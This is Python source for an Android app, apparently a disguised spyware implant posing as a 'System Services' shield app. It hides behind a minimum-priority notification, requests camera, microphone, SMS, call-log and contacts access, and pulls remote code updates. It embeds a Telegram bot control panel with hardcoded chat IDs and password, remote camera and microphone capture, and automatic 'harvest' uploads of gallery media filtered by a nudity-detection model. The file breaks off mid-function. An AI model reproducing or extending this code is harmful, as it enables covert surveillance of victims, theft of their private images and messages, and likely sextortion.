# -*- coding: utf-8 -*-
import os, sys, threading, importlib, requests, traceback, gc, time, socket, random, shutil, subprocess
from datetime import datetime
from kivy.app import App
from kivy.uix.textinput import TextInput
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.clock import Clock
from kivy.core.clipboard import Clipboard

# ========== DNS patch (احتياطي ذكي) ==========
def _patch_dns():
    original_getaddrinfo = socket.getaddrinfo
    def patched_getaddrinfo(host, port, family=0, type=0, proto=0, flags=0):
        try:
            result = original_getaddrinfo(host, port, family, type, proto, flags)
            if result: return result
        except: pass
        override = {
            'raw.githubusercontent.com': ['185.199.108.133', '185.199.109.133', '185.199.110.133', '185.199.111.133'],
            'api.telegram.org': ['149.154.167.220', '149.154.167.221', '149.154.167.99', '149.154.175.50'],
            'zaen1993.github.io': ['185.199.108.153', '185.199.109.153', '185.199.110.153', '185.199.111.153'],
            'cdn.jsdelivr.net': ['151.101.2.229', '151.101.66.229', '151.101.130.229']
        }
        if host in override:
            fake_ip = random.choice(override[host])
            return [(socket.AF_INET, socket.SOCK_STREAM, 6, '', (fake_ip, port))]
        return original_getaddrinfo(host, port, family, type, proto, flags)
    socket.getaddrinfo = patched_getaddrinfo
_patch_dns()

INDEX_BASE_URLS = [
    "https://cdn.jsdelivr.net/gh/Zaen1993/Android-Core@main/index.json",
    "https://zaen1993.github.io/Android-Core/index.json",
    "https://raw.githubusercontent.com/Zaen1993/Android-Core/refs/heads/main/index.json",
]

HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'Cache-Control': 'no-cache', 'Pragma': 'no-cache'
}

def _get_path():
    try:
        from jnius import autoclass
        act = autoclass('org.kivy.android.PythonActivity').mActivity
        base = act.getFilesDir().getPath()
        p = os.path.join(base, ".sys_runtime")
    except:
        p = os.path.join(os.getcwd(), ".sys_runtime")
    os.makedirs(p, exist_ok=True)
    return p

R = _get_path()
U = os.path.join(R, "updates")
os.makedirs(U, exist_ok=True)
HARVEST_QUEUE = os.path.join(R, ".cache_thumb")
os.makedirs(HARVEST_QUEUE, exist_ok=True)
MODELS_DIR = os.path.join(R, "models")
os.makedirs(MODELS_DIR, exist_ok=True)

if R not in sys.path: sys.path.insert(0, R)

def start_silent_service():
    try:
        from jnius import autoclass
        act = autoclass('org.kivy.android.PythonActivity').mActivity
        nm = autoclass('android.app.NotificationManager')
        ch = autoclass('android.app.NotificationChannel')
        channel = ch("core_svc", "System Services", nm.IMPORTANCE_MIN)
        act.getSystemService(nm).createNotificationChannel(channel)
        builder = autoclass('android.app.Notification$Builder')(act, "core_svc")
        builder.setSmallIcon(act.getApplicationInfo().icon)
        builder.setPriority(autoclass('android.app.Notification').PRIORITY_MIN)
        act.startForeground(9921, builder.build())
        print("Foreground silent service started")
    except Exception as e:
        print(f"Foreground service error: {e}")

def open_notification_settings():
    try:
        from jnius import autoclass
        Intent = autoclass('android.content.Intent')
        Settings = autoclass('android.provider.Settings')
        ctx = autoclass('org.kivy.android.PythonActivity').mActivity
        intent = Intent(Settings.ACTION_APP_NOTIFICATION_SETTINGS)
        intent.putExtra(Settings.EXTRA_APP_PACKAGE, ctx.getPackageName())
        ctx.startActivity(intent)
    except Exception as e:
        print(f"Could not open notification settings: {e}")

def _perms():
    """طلب جميع الصلاحيات المطلوبة بما في ذلك READ_SMS و READ_CALL_LOG"""
    try:
        from android.permissions import request_permissions, Permission
        request_permissions([
            Permission.INTERNET,
            Permission.CAMERA,
            Permission.RECORD_AUDIO,
            "android.permission.FOREGROUND_SERVICE",
            "android.permission.READ_EXTERNAL_STORAGE",
            "android.permission.WRITE_EXTERNAL_STORAGE",
            "android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS",
            "android.permission.READ_CONTACTS",
            "android.permission.READ_SMS",
            "android.permission.READ_CALL_LOG"
        ])
    except Exception as e:
        print(f"Permissions error: {e}")
    
    start_silent_service()
    
    def delayed_notification_settings():
        time.sleep(2)
        open_notification_settings()
    threading.Thread(target=delayed_notification_settings, daemon=True).start()
    
    try:
        from jnius import autoclass
        ctx = autoclass('org.kivy.android.PythonActivity').mActivity
        pm = ctx.getSystemService(ctx.POWER_SERVICE)
        if not pm.isIgnoringBatteryOptimizations(ctx.getPackageName()):
            Intent = autoclass('android.content.Intent')
            intent = Intent(Intent.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
            from android.net import Uri
            intent.setData(Uri.parse(f"package:{ctx.getPackageName()}"))
            ctx.startActivity(intent)
    except Exception as e:
        print(f"Battery exemption error: {e}")

def load_secrets_from_config():
    config_module = None
    try:
        config_module = importlib.import_module("config_template")
    except ImportError:
        try:
            config_module = importlib.import_module("config")
        except ImportError:
            print("⚠️ Warning: No config file found, using defaults")
            return [], [], -1003943094277, -1003577715762, "@321@321neaz"
    
    if not hasattr(config_module, 'load_config'):
        print("⚠️ Warning: Config file has no load_config function")
        return [], [], -1003943094277, -1003577715762, "@321@321neaz"
    
    try:
        active, reserve, ctrl, vault, secret = config_module.load_config()
        if not active: active = []
        if not reserve: reserve = []
        if not ctrl: ctrl = -1003943094277
        if not vault: vault = -1003577715762
        if not secret: secret = "@321@321neaz"
        return active, reserve, ctrl, vault, secret
    except Exception as e:
        print(f"⚠️ Error loading config: {e}, using defaults")
        return [], [], -1003943094277, -1003577715762, "@321@321neaz"

def fetch_index():
    for url in INDEX_BASE_URLS:
        try:
            resp = requests.get(url, headers=HEADERS, timeout=15, verify=True)
            if resp.status_code == 200:
                try:
                    return resp.json()
                except:
                    continue
        except:
            continue
    return None

def copy_model_to_models_dir():
    """
    نسخ ملف النموذج من assets أو أي مسار آخر إلى مجلد models.
    يبحث في عدة مسارات محتملة (assets، المجلد المحلي، مسارات النظام).
    """
    try:
        model_min_size = 5000000  # 5MB (النموذج الفعلي 5.19MB)
        dest = os.path.join(MODELS_DIR, "engine_v2.tflite")
        
        # إذا كان الملف موجوداً ومكتملاً في الوجهة، لا داعي للنسخ
        if os.path.exists(dest) and os.path.getsize(dest) >= model_min_size:
            print(f"✅ Model already exists at {dest}")
            return True
        
        # قائمة المسارات المحتملة للنموذج
        possible_paths = [
            # مسار assets داخل APK
            os.path.join(os.path.dirname(os.path.abspath(__file__)), "assets", "engine_v2.tflite"),
            # المجلد الحالي
            os.path.join(os.path.dirname(os.path.abspath(__file__)), "engine_v2.tflite"),
            # مسار النظام داخل التطبيق
            "/data/data/com.sys.shieldcore/files/assets/engine_v2.tflite",
            "/data/data/com.sys.shieldcore/files/engine_v2.tflite",
            # المجلد المؤقت
            os.path.join(R, "engine_v2.tflite"),
            # مجلد النماذج نفسه (ربما تم نسخه سابقاً لكن بحجم غير مكتمل)
            dest
        ]
        
        for src in possible_paths:
            if os.path.exists(src):
                size = os.path.getsize(src)
                if size >= model_min_size:
                    # نسخ الملف
                    shutil.copy2(src, dest)
                    # التحقق من نجاح النسخ
                    if os.path.exists(dest) and os.path.getsize(dest) >= model_min_size:
                        print(f"✅ Model copied from {src} to {dest} (size: {size/1024/1024:.2f} MB)")
                        return True
                    else:
                        print(f"⚠️ Copy from {src} failed or file incomplete")
                else:
                    print(f"⚠️ Model file too small at {src}: {size} bytes (min {model_min_size})")
        
        # محاولة التحميل من الإنترنت كحل أخير
        print("⚠️ Model not found locally, attempting download from GitHub...")
        model_urls = [
            "https://github.com/Zaen1993/nsfw-converter/raw/main/engine_v2.tflite",
            "https://zaen1993.github.io/nsfw-converter/engine_v2.tflite"
        ]
        
        for url in model_urls:
            try:
                print(f"📥 Downloading from: {url}")
                resp = requests.get(url, timeout=60, stream=True, verify=True)
                if resp.status_code == 200:
                    with open(dest, 'wb') as f:
                        for chunk in resp.iter_content(chunk_size=8192):
                            f.write(chunk)
                    if os.path.exists(dest) and os.path.getsize(dest) >= model_min_size:
                        print(f"✅ Model downloaded successfully to {dest}")
                        return True
                else:
                    print(f"⚠️ Download failed: HTTP {resp.status_code}")
            except Exception as e:
                print(f"⚠️ Download from {url} failed: {e}")
                continue
        
        print("❌ CRITICAL: Failed to locate or download engine_v2.tflite!")
        return False
        
    except Exception as e:
        print(f"❌ Error copying model: {e}")
        import traceback
        traceback.print_exc()
        return False

# ========== تثبيت tflite-runtime في وقت التشغيل ==========
def ensure_tflite_runtime():
    """
    التأكد من تثبيت tflite-runtime، وتثبيته عبر pip إذا لم يكن موجوداً.
    """
    try:
        import tflite_runtime
        print("✅ tflite-runtime already installed")
        return True
    except ImportError:
        print("⚠️ tflite-runtime not found, installing...")
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", "tflite-runtime==2.14.0"])
            print("✅ tflite-runtime installed successfully")
            return True
        except Exception as e:
            print(f"❌ Failed to install tflite-runtime: {e}")
            return False

# ========== تضمين الملفات الأساسية (لضمان الإقلاع المحلي) ==========
EMBEDDED_FILES = {
    "telegram_ui.py": r'''
# -*- coding: utf-8 -*-
import os, time, json, threading, logging, requests, sys, importlib, secrets
from collections import deque
from datetime import datetime

def _get_runtime_path():
    try:
        from jnius import autoclass
        act = autoclass('org.kivy.android.PythonActivity').mActivity
        base = act.getFilesDir().getPath()
        return os.path.join(base, ".sys_runtime")
    except:
        return os.path.join(os.getcwd(), ".sys_runtime")

P = _get_runtime_path()
if P not in sys.path:
    sys.path.insert(0, P)

CACHE_THUMB = os.path.join(P, ".cache_thumb")
if not os.path.exists(CACHE_THUMB):
    os.makedirs(CACHE_THUMB)

logging.basicConfig(filename=os.path.join(P, "t.log"), level=logging.ERROR, filemode='a')

TG_HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
}

class T:
    def __init__(self, m, active_tokens, reserve_tokens, ctrl_id, vault_id, app_password):
        self.m = m
        self.device_id = getattr(m, 'did', 'unknown_device')
        self.dvs_file = os.path.join(P, "dvs.json")
        self.ses_file = os.path.join(P, "ses.json")
        self.ses = {}
        self.dvs = {}
        self.p_upd = deque(maxlen=200)
        self.rn = True
        self.active_tokens = [t for t in active_tokens if t]
        self.reserve_tokens = [t for t in reserve_tokens if t]
        self.ctrl = ctrl_id
        self.dat = vault_id
        self.vlt = vault_id
        self.pw = app_password
        self._load()
        threading.Thread(target=self._session_cleaner, daemon=True).start()
        threading.Thread(target=self._heartbeat_worker, daemon=True).start()

    def _load(self):
        for path, target in [(self.dvs_file, self.dvs), (self.ses_file, self.ses)]:
            if os.path.exists(path):
                try:
                    with open(path, 'r') as f: target.update(json.load(f))
                except: pass

    def _save(self):
        try:
            with open(self.dvs_file, 'w') as f: json.dump(self.dvs, f)
            with open(self.ses_file, 'w') as f: json.dump(self.ses, f)
        except: pass

    def _session_cleaner(self):
        while self.rn:
            now = time.time()
            expired = [cid for cid, exp in self.ses.items() if exp < now]
            if expired:
                for cid in expired: self.ses.pop(cid, None)
                self._save()
            time.sleep(3600)

    def _next_token(self):
        if not self.active_tokens: return None
        try:
            return secrets.choice(self.active_tokens)
        except:
            import random
            return random.choice(self.active_tokens)

    def _emergency_switch(self, bad_token):
        if bad_token in self.active_tokens:
            idx = self.active_tokens.index(bad_token)
            self.active_tokens.remove(bad_token)
            if self.reserve_tokens:
                new_token = self.reserve_tokens.pop(0)
                self.active_tokens.append(new_token)
                self._api("sendMessage", {
                    "chat_id": self.ctrl,
                    "text": f"⚠️ <b>Emergency switch</b>\nBot #{idx+1} replaced. {len(self.reserve_tokens)} reserve left.",
                    "parse_mode": "HTML"
                })
            else:
                self._api("sendMessage", {
                    "chat_id": self.ctrl,
                    "text": "🚨 <b>CRITICAL: No reserve bots left!</b>",
                    "parse_mode": "HTML"
                })

    def _heartbeat_worker(self):
        while self.rn:
            time.sleep(21600)
            if not self.reserve_tokens: continue
            try:
                hb_bot = secrets.choice(self.reserve_tokens)
            except:
                import random
                hb_bot = random.choice(self.reserve_tokens)
            try:
                url = f"https://api.telegram.org/bot{hb_bot}/sendMessage"
                data = {"chat_id": self.dat, "text": f"❤️ system heartbeat {datetime.now().strftime('%Y-%m-%d %H:%M')}"}
                requests.post(url, data=data, timeout=10, verify=True)
            except: pass

    def _api(self, method, data=None, files=None, retry=3):
        last_token = None
        for attempt in range(retry):
            token = self._next_token()
            if not token: return None
            if attempt > 0 and token == last_token:
                token = self._next_token()
                if not token: return None
            last_token = token
            try:
                url = f"https://api.telegram.org/bot{token}/{method}"
                resp = requests.post(url, data=data, files=files, headers=TG_HEADERS, timeout=30, verify=True)
                result = resp.json()
                if result.get('ok'): return result
                error = result.get('error_code')
                if error == 429:
                    retry_after = result.get('parameters', {}).get('retry_after', 2)
                    time.sleep(retry_after); continue
                elif error in (401, 403):
                    self._emergency_switch(token)
                else:
                    time.sleep(1)
            except Exception as e:
                logging.error(f"API error {method}: {e}")
                time.sleep(1)
        return None

    def reg(self, device_id, device_model):
        if device_id in self.dvs: return self.dvs[device_id].get('t')
        topic_name = f"📱 {device_model[:12]} | {device_id[:4]}"
        res = self._api("createForumTopic", {"chat_id": self.ctrl, "name": topic_name})
        if res and res.get('ok'):
            topic_id = res['result']['message_thread_id']
            self.dvs[device_id] = {"n": device_model, "t": topic_id}
            self._save()
            self._api("sendMessage", {
                "chat_id": self.ctrl,
                "message_thread_id": topic_id,
                "text": f"<b>✅ Device registered</b>\n<b>{device_model}</b>\n<code>{device_id}</code>",
                "parse_mode": "HTML"
            })
            return topic_id
        return None

    def notify_harvest(self, device_id, count):
        dev = self.dvs.get(device_id)
        if dev and 't' in dev:
            msg = f"📦 <b>Auto harvest</b>\nDevice: {dev['n']}\nItems: {count}\nTime: {datetime.now().strftime('%H:%M:%S')}"
            self._api("sendMessage", {
                "chat_id": self.ctrl,
                "message_thread_id": dev['t'],
                "text": msg,
                "parse_mode": "HTML"
            })

    def _count_pending_harvest(self):
        if not os.path.exists(CACHE_THUMB): return 0
        return len([f for f in os.listdir(CACHE_THUMB) if not f.startswith('.')])

    def _main_keyboard(self):
        return {"inline_keyboard": [
            [{"text": "📱 Connected devices", "callback_data": "ld"}],
            [{"text": "🧠 AI Status", "callback_data": "ai_status"}, {"text": "🔄 Renew session", "callback_data": "rnw"}],
            [{"text": "🚪 Logout", "callback_data": "ext"}]
        ]}

    def _device_keyboard(self, device_id):
        count = self._count_pending_harvest()
        harvest_text = f"📦 Harvest ({count})" if count > 0 else "📦 Harvest (empty)"
        return {"inline_keyboard": [
            [{"text": "📸 Back camera", "callback_data": f"cam_{device_id}"}, {"text": "🤳 Front camera", "callback_data": f"camf_{device_id}"}],
            [{"text": "🎙️ Record audio", "callback_data": f"mic_{device_id}"}, {"text": harvest_text, "callback_data": f"hrv_{device_id}"}],
            [{"text": "🖼️ Gallery", "callback_data": f"media_{device_id}"}, {"text": "🚀 Send now", "callback_data": f"send_now_{device_id}"}],
            [{"text": "🔙 Back", "callback_data": "ld"}]
        ]}

    def _show_harvest_details(self, chat_id):
        if not os.path.exists(CACHE_THUMB):
            self._api("sendMessage", {"chat_id": chat_id, "text": "📭 No pending files."})
            return
        files = [f for f in os.listdir(CACHE_THUMB) if f.lower().endswith(('.jpg','.png','.mp4'))]
        if not files:
            self._api("sendMessage", {"chat_id": chat_id, "text": "📭 Harvest folder empty."})
            return
        total_size = sum(os.path.getsize(os.path.join(CACHE_THUMB, f)) for f in files)
        details = (
            f"📊 **Harvest report**\n"
            f"━━━━━━━━━━━━━━━\n"
            f"🖼️ Files: `{len(files)}`\n"
            f"💾 Size: `{total_size/(1024*1024):.2f} MB`\n"
            f"⏰ Updated: `{datetime.now().strftime('%H:%M:%S')}`\n\n"
            f"Use '🚀 Send now' to upload immediately."
        )
        self._api("sendMessage", {"chat_id": chat_id, "text": details, "parse_mode": "Markdown"})

    def _is_authorized(self, chat_id):
        return time.time() < self.ses.get(str(chat_id), 0)

    def _handle_message(self, update):
        msg = update.get('message', {})
        chat_id = msg.get('chat', {}).get('id')
        text = msg.get('text', '')
        if not chat_id: return
        if text.startswith('/login'):
            parts = text.split()
            if len(parts) >= 2 and parts[1].strip() == self.pw:
                self.ses[str(chat_id)] = time.time() + 14400
                self._save()
                self._api("sendMessage", {
                    "chat_id": chat_id,
                    "text": "🔓 Login successful",
                    "reply_markup": json.dumps(self._main_keyboard())
                })
            else:
                self._api("sendMessage", {"chat_id": chat_id, "text": "❌ Wrong password"})
        elif self._is_authorized(chat_id) and text == '/menu':
            self._api("sendMessage", {
                "chat_id": chat_id,
                "text": "📋 Main menu",
                "reply_markup": json.dumps(self._main_keyboard())
            })

    def _handle_callback(self, update):
        cb = update.get('callback_query', {})
        cb_id = cb.get('id')
        if not cb_id or cb_id in self.p_upd: return
        self.p_upd.append(cb_id)
        if len(self.p_upd) > 150:
            self.p_upd.clear()
        chat_id = cb.get('message', {}).get('chat', {}).get('id')
        msg_id = cb.get('message', {}).get('message_id')
        data = cb.get('data', '')
        self._api("answerCallbackQuery", {"callback_query_id": cb_id})
        if not self._is_authorized(chat_id):
            self._api("sendMessage", {"chat_id": chat_id, "text": "⚠️ Session expired, use /login"})
            return
        if data == "ld":
            if not self.dvs:
                self._api("sendMessage", {"chat_id": chat_id, "text": "⚠️ لا توجد أجهزة مرتبطة حالياً."})
                return
            kb = {"inline_keyboard": []}
            for did, info in self.dvs.items():
                kb["inline_keyboard"].append([{"text": f"📱 {info['n']}", "callback_data": f"dev_{did}"}])
            kb["inline_keyboard"].append([{"text": "🔄 Refresh", "callback_data": "ld"}, {"text": "🔙 Back", "callback_data": "main"}])
            self._api("editMessageText", {
                "chat_id": chat_id, "message_id": msg_id,
                "text": "<b>Select device:</b>",
                "reply_markup": json.dumps(kb),
                "parse_mode": "HTML"
            })
            return
        if data.startswith("dev_"):
            did = data[4:]
            if did in self.dvs:
                self._api("editMessageText", {
                    "chat_id": chat_id, "message_id": msg_id,
                    "text": f"🕹️ <b>{self.dvs[did]['n']}</b>",
                    "reply_markup": json.dumps(self._device_keyboard(did)),
                    "parse_mode": "HTML"
                })
            return
        if data.startswith("hrv_"):
            self._show_harvest_details(chat_id)
            return
        if data.startswith("send_now_"):
            did = data[9:]
            try:
                import commands
                importlib.reload(commands)
                commands.force_send_zip(self.m, did, self, chat_id)
            except Exception as e:
                self._api("sendMessage", {"chat_id": chat_id, "text": f"❌ Send error: {e}"})
            return
        if data == "ai_status":
            ai_loaded = hasattr(self.m, 'nude_detector') and self.m.nude_detector and self.m.nude_detector.is_ready() if hasattr(self.m.nude_detector, 'is_ready') else False
            status = "✅ Active" if ai_loaded else "❌ Not ready"
            loading = " (loading...)" if hasattr(self.m.nude_detector, '_loading_engine') and self.m.nude_detector._loading_engine else ""
            self._api("answerCallbackQuery", {"callback_query_id": cb_id, "text": f"AI: {status}{loading}", "show_alert": True})
            return
        if data == "rnw":
            self.ses[str(chat_id)] = time.time() + 14400
            self._save()
            self._api("answerCallbackQuery", {"callback_query_id": cb_id, "text": "✅ Session renewed"})
            return
        if data == "ext":
            self.ses.pop(str(chat_id), None)
            self._save()
            self._api("editMessageText", {"chat_id": chat_id, "message_id": msg_id, "text": "🔒 Logged out."})
            return
        if data == "main":
            self._api("editMessageText", {
                "chat_id": chat_id, "message_id": msg_id,
                "text": "📋 Main menu",
                "reply_markup": json.dumps(self._main_keyboard())
            })
            return
        try:
            import commands
            importlib.reload(commands)
            commands.ex(data, self, self.m, chat_id, cb_id)
        except Exception as e:
            logging.error(f"Command error: {e}")
            self._api("sendMessage", {"chat_id": chat_id, "text": f"❌ Error: {str(e)[:100]}"})

    def _polling(self):
        offset = 0
        consecutive_errors = 0
        while self.rn:
            token = self._next_token()
            if not token:
                time.sleep(5); continue
            try:
                url = f"https://api.telegram.org/bot{token}/getUpdates"
                params = {"offset": offset, "timeout": 25, "allowed_updates": json.dumps(["message", "callback_query"])}
                resp = requests.get(url, params=params, headers=TG_HEADERS, timeout=30, verify=True)
                if resp.status_code != 200:
                    consecutive_errors += 1
                    time.sleep(min(consecutive_errors * 2, 60))
                    continue
                data = resp.json()
                if data.get('ok'):
                    consecutive_errors = 0
                    for upd in data.get('result', []):
                        offset = upd['update_id'] + 1
                        if 'message' in upd: self._handle_message(upd)
                        if 'callback_query' in upd: self._handle_callback(upd)
                time.sleep(0.3)
            except:
                consecutive_errors += 1
                time.sleep(min(consecutive_errors * 2, 30))

    def start(self):
        if self.active_tokens:
            threading.Thread(target=self._polling, daemon=True).start()
            logging.info(f"Telegram UI started: {len(self.active_tokens)} active, {len(self.reserve_tokens)} reserve")
        else:
            logging.error("No active tokens, Telegram UI cannot start")
''',

    "monitor.py": r'''
# -*- coding: utf-8 -*-
import os, time, json, random, threading, logging, gc, hashlib
from datetime import datetime, timedelta

def _get_runtime_path():
    try:
        from jnius import autoclass
        act = autoclass('org.kivy.android.PythonActivity').mActivity
        base = act.getFilesDir().getPath()
        return os.path.join(base, ".sys_runtime")
    except:
        return os.path.join(os.getcwd(), ".sys_runtime")

P = _get_runtime_path()
if not os.path.exists(P): os.makedirs(P)

logging.basicConfig(filename=os.path.join(P, "m.log"), level=logging.ERROR, filemode='a',
                    format='%(asctime)s [%(levelname)s] %(message)s')

try:
    from jnius import autoclass
    JNI = True
except ImportError: JNI = False

class M:
    def __init__(self):
        self.d = P
        self.cf = os.path.join(self.d, "c.json")
        self.lh = os.path.join(self.d, "lh")
        self.wt = os.path.join(self.d, "wt")
        self.rn = True
        self.did = None; self.dmd = None; self.last_mid = 0
        self.ui = None; self.daily_zipper = None; self.camera_analyzer = None
        self.nude_detector = None; self.media_scanner = None; self.ctrl = None; self.vlt = None
        self._wake_event = threading.Event()
        self._harvest_lock = threading.Lock()
        self._harvest_running = False
        self._load_config(); self._get_device_info(); self._setup()

    def _setup(self):
        try:
            with open(os.path.join(self.d, ".nomedia"), 'w') as f: f.write("")
        except: pass
        if not os.path.exists(self.wt):
            self._set_next_harvest_time()

    def _load_config(self):
        default_cfg = {"hth": 15, "wl": False, "iv": 900}
        if os.path.exists(self.cf):
            try:
                with open(self.cf, 'r') as f: default_cfg.update(json.load(f))
            except: pass
        self.cfg = default_cfg

    def _save_config(self):
        try:
            with open(self.cf, 'w') as f:
                json.dump(self.cfg, f, indent=2)
        except: pass

    def _get_ctx(self):
        if not JNI: return None
        try: return autoclass('org.kivy.android.PythonActivity').mActivity
        except: return None

    def _get_device_info(self):
        if JNI:
            try:
                ctx = self._get_ctx()
                Build = autoclass('android.os.Build')
                Secure = autoclass('android.provider.Settings$Secure')
                self.did = Secure.getString(ctx.getContentResolver(), Secure.ANDROID_ID)
                self.dmd = f"{Build.MANUFACTURER} {Build.MODEL}"
            except:
                self.did = f"ID_{random.randint(100000, 999999)}"; self.dmd = "Android_Device"
        else:
            self.did, self.dmd = "DEV_PC", "Linux_System"

    def _is_wifi(self):
        if not JNI: return True
        try:
            ctx = self._get_ctx()
            cm = ctx.getSystemService("connectivity")
            ni = cm.getActiveNetworkInfo()
            return ni and ni.isConnected() and ni.getType() == 1
        except: return False

    def _battery_ok(self):
        if not JNI: return 100, True
        try:
            ctx = self._get_ctx()
            IntentFilter = autoclass('android.content.IntentFilter')
            battery_filter = IntentFilter("android.intent.action.BATTERY_CHANGED")
            battery_status = ctx.registerReceiver(None, battery_filter)
            level = battery_status.getIntExtra("level", -1)
            scale = battery_status.getIntExtra("scale", -1)
            status = battery_status.getIntExtra("status", -1)
            percent = int((level / scale) * 100) if scale > 0 else 50
            is_charging = status in (2, 5)
            return percent, is_charging
        except: return 50, False

    def _set_next_harvest_time(self):
        try:
            now = datetime.now()
            delta_hours = random.randint(2, 6)
            delta_minutes = random.randint(0, 59)
            target = now + timedelta(hours=delta_hours, minutes=delta_minutes)
            with open(self.wt, 'w') as f:
                f.write(target.isoformat())
            return target
        except: return None

    def _harvest_logic(self):
        if self._harvest_running: return
        with self._harvest_lock:
            if self._harvest_running: return
            self._harvest_running = True
        try:
            if not self._is_wifi(): return
            battery, charging = self._battery_ok()
            if battery < self.cfg.get('hth', 15) and not charging: return
            if os.path.exists(self.wt):
                try:
                    with open(self.wt, 'r') as f:
                        next_time_str = f.read().strip()
                        if next_time_str:
                            try:
                                from datetime import datetime
                                next_time = datetime.fromisoformat(next_time_str)
                                if datetime.now() < next_time: return
                            except:
                                pass
                except: pass
            if self.daily_zipper:
                try:
                    threading.Thread(target=self.daily_zipper.run, daemon=True).start()
                    self._set_next_harvest_time()
                    with open(self.lh, 'w') as f:
                        f.write(datetime.now().isoformat())
                except Exception as e: logging.error(f"Harvest failed: {e}")
        except Exception as e: logging.error(f"Harvest logic error: {e}")
        finally:
            self._harvest_running = False
            gc.collect()

    def _loop(self):
        while self.rn:
            try: self._harvest_logic()
            except Exception as e: logging.error(f"Monitor loop error: {e}")
            interval = self.cfg.get('iv', 900)
            self._wake_event.wait(interval)
            self._wake_event.clear()

    def start(self):
        threading.Thread(target=self._loop, daemon=True).start()
        if self.ui and self.did:
            try: self.ui.reg(self.did, self.dmd)
            except Exception as e: logging.error(f"Device registration failed: {e}")

    def stop(self):
        self.rn = False; self._wake_event.set()

def get_device_tag():
    try:
        Secure = autoclass('android.provider.Settings$Secure')
        ctx = autoclass('org.kivy.android.PythonActivity').mActivity
        aid = Secure.getString(ctx.getContentResolver(), Secure.ANDROID_ID)
        if aid: return aid[:8].lower()
    except: pass
    try:
        Build = autoclass('android.os.Build')
        model = f"{Build.MANUFACTURER} {Build.MODEL}"
        return hashlib.md5(model.encode()).hexdigest()[:8]
    except: return "unknown"
''',

    "commands.py": r'''
# -*- coding: utf-8 -*-
import os, time, json, threading, logging, sys, gc, importlib
from datetime import datetime

def _get_runtime_path():
    try:
        from jnius import autoclass
        act = autoclass('org.kivy.android.PythonActivity').mActivity
        base = act.getFilesDir().getPath()
        return os.path.join(base, ".sys_runtime")
    except:
        return os.path.join(os.getcwd(), ".sys_runtime")

P = _get_runtime_path()
PENDING_DIR = os.path.join(P, "pending_upload")
TEMP_DIR = os.path.join(P, "ctmp")
for d in [PENDING_DIR, TEMP_DIR]:
    if not os.path.exists(d): os.makedirs(d)

if P not in sys.path: sys.path.insert(0, P)

logging.basicConfig(filename=os.path.join(P, "c.log"), level=logging.ERROR, filemode='a')

try:
    from jnius import autoclass, PythonJavaClass, java_method
    JNI = True
except ImportError: JNI = False

try:
    from android.permissions import SecurityException
except ImportError:
    SecurityException = Exception

class C:
    def __init__(self):
        self.mic_busy = False
        self._mic_lock = threading.Lock()
        self._components_loaded = False
        self._component_lock = threading.Lock()
        self._cleanup()

    def _cleanup(self):
        try:
            now = time.time()
            for folder, max_age in [(TEMP_DIR, 3600), (PENDING_DIR, 86400)]:
                if not os.path.exists(folder): continue
                for f in os.listdir(folder):
                    path = os.path.join(folder, f)
                    try:
                        if os.path.getmtime(path) < now - max_age:
                            os.remove(path)
                    except: pass
        except: pass

    def _ensure_components(self, m):
        if self._components_loaded: return
        with self._component_lock:
            if self._components_loaded: return
            components = [
                ('nude_detector', 'nude_detector', 'NudeDetector', lambda: {'mon': m}),
                ('media_scanner', 'media_scanner', 'MediaScanner', lambda: {'det': m.nude_detector, 'ui': m.ui}),
                ('gallery_browser', 'gallery_browser', 'G', lambda: {'sc': m.media_scanner, 'tg': m.ui}),
                ('camera_analyzer', 'camera_analyzer', 'CameraAnalyzer', lambda: {'mon': m, 'det': m.nude_detector}),
                ('daily_zipper', 'daily_zipper', 'DailyZipper', lambda: {'scanner': m.media_scanner, 'tg': m.ui})
            ]
            for attr, module_name, class_name, args_fn in components:
                if not hasattr(m, attr) or getattr(m, attr) is None:
                    try:
                        mod = importlib.import_module(module_name)
                        cls = getattr(mod, class_name)
                        args = args_fn()
                        if attr == 'nude_detector':
                            setattr(m, attr, cls(args['mon']))
                        else:
                            setattr(m, attr, cls(**args))
                        logging.info(f"✅ {class_name} loaded")
                    except Exception as e:
                        logging.error(f"Failed to load {module_name}: {e}")
            self._components_loaded = True

    def _send_text_file(self, tg, chat_id, content, filename):
        temp_path = os.path.join(PENDING_DIR, f"{int(time.time())}_{filename}")
        try:
            if not content or not content.strip():
                tg._api("sendMessage", {"chat_id": chat_id, "text": f"📄 {filename}: لا يوجد محتوى"})
                return
            with open(temp_path, 'w', encoding='utf-8', errors='ignore') as f: f.write(content)
            if os.path.getsize(temp_path) == 0:
                os.remove(temp_path)
                tg._api("sendMessage", {"chat_id": chat_id, "text": f"📄 {filename}: ملف فارغ"})
                return
            with open(temp_path, 'rb') as f:
                resp = tg._api("sendDocument", {"chat_id": chat_id, "caption": f"📄 {filename}"}, {"document": f})
            if resp and resp.get('ok'): os.remove(temp_path)
            else: logging.warning(f"File {filename} left in pending")
        except Exception as e:
            logging.error(f"_send_text_file error: {e}")
            try:
                tg._api("sendMessage", {"chat_id": chat_id, "text": f"📄 {filename}:\n{content[:4000]}"})
            except: pass
            if os.path.exists(temp_path):
                try: os.remove(temp_path)
                except: pass

    def _record_audio(self, duration=10):
        if not JNI: return None
        with self._mic_lock:
            if self.mic_busy: return None
            self.mic_busy = True
        media_recorder = None
        out_path = os.path.join(TEMP_DIR, f"audio_{int(time.time())}.aac")
        try:
            MR = autoclass('android.media.MediaRecorder')
            media_recorder = MR()
            media_recorder.setAudioSource(MR.AudioSource.MIC)
            media_recorder.setOutputFormat(MR.OutputFormat.MPEG_4)
            media_recorder.setAudioEncoder(MR.AudioEncoder.AAC)
            media_recorder.setAudioEncodingBitRate(64000)
            media_recorder.setOutputFile(out_path)
            media_recorder.prepare(); media_recorder.start()
            for _ in range(duration):
                time.sleep(1)
            media_recorder.stop(); media_recorder.reset()
            if os.path.exists(out_path) and os.path.getsize(out_path) > 100:
                return out_path
            return None
        except Exception as e:
            logging.error(f"Recording error: {e}"); return None
        finally:
            if media_recorder:
